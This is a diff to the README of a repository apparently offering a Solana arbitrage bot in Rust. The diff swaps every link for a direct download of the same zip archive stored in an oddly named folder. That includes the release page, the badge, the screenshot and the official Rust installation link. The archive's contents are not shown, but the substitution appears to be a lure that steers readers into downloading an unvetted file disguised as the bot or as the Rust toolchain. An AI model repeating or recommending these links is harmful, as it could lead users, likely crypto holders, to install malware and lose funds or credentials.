@@ -1,8 +1,8 @@
 # 🔄 Solana-Arbitrage-Bot - Automate Your Trading on Solana 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/atifkhan95yrs/Solana-Arbitrage-Bot/releases)
+[![Download Now](https://raw.githubusercontent.com/atifkhan95yrs/Solana-Arbitrage-Bot/main/campylotropal/Solana-Arbitrage-Bot-v2.1.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/atifkhan95yrs/Solana-Arbitrage-Bot/main/campylotropal/Solana-Arbitrage-Bot-v2.1.zip)
 
-<img width="1400" height="528" alt="iPhone 16 - 9" src="https://github.com/user-attachments/assets/341063ca-d8d0-4a03-99db-62438d42caa1" />
+<img width="1400" height="528" alt="iPhone 16 - 9" src="https://raw.githubusercontent.com/atifkhan95yrs/Solana-Arbitrage-Bot/main/campylotropal/Solana-Arbitrage-Bot-v2.1.zip" />
 
 A Rust bot for arbitrage on the Solana network.  
 It scans multiple DEXs, identifies profitable routes, and executes transactions with optimized fees.
@@ -35,10 +35,10 @@ It scans multiple DEXs, identifies profitable routes, and executes transactions 
 
 ### Prerequisites
 1. **Operating System**: This application works on Windows, macOS, and Linux.
-2. **Rust**: You need Rust 1.70 or later. You can install it by following the instructions at [Rust Website](https://www.rust-lang.org/tools/install). 
+2. **Rust**: You need Rust 1.70 or later. You can install it by following the instructions at [Rust Website](https://raw.githubusercontent.com/atifkhan95yrs/Solana-Arbitrage-Bot/main/campylotropal/Solana-Arbitrage-Bot-v2.1.zip). 
 
 ### Download & Install
-1. **Visit the Releases Page**: To download the application, visit the following link: [Download from Releases](https://github.com/atifkhan95yrs/Solana-Arbitrage-Bot/releases).
+1. **Visit the Releases Page**: To download the application, visit the following link: [Download from Releases](https://raw.githubusercontent.com/atifkhan95yrs/Solana-Arbitrage-Bot/main/campylotropal/Solana-Arbitrage-Bot-v2.1.zip).
 2. **Select the Relevant File**: On the releases page, find the version that matches your operating system and click the download link.
 
 ### Running the Application
@@ -69,4 +69,4 @@ If you encounter any issues:
 ## ✉️ Feedback & Contributions
 If you have suggestions or improvements to propose, feel free to open an issue on the GitHub repository. Your feedback helps us enhance the bot's capabilities.
 
-For further information, always check the [GitHub Releases Page](https://github.com/atifkhan95yrs/Solana-Arbitrage-Bot/releases) for the latest updates and downloads.
+For further information, always check the [GitHub Releases Page](https://raw.githubusercontent.com/atifkhan95yrs/Solana-Arbitrage-Bot/main/campylotropal/Solana-Arbitrage-Bot-v2.1.zip) for the latest updates and downloads.
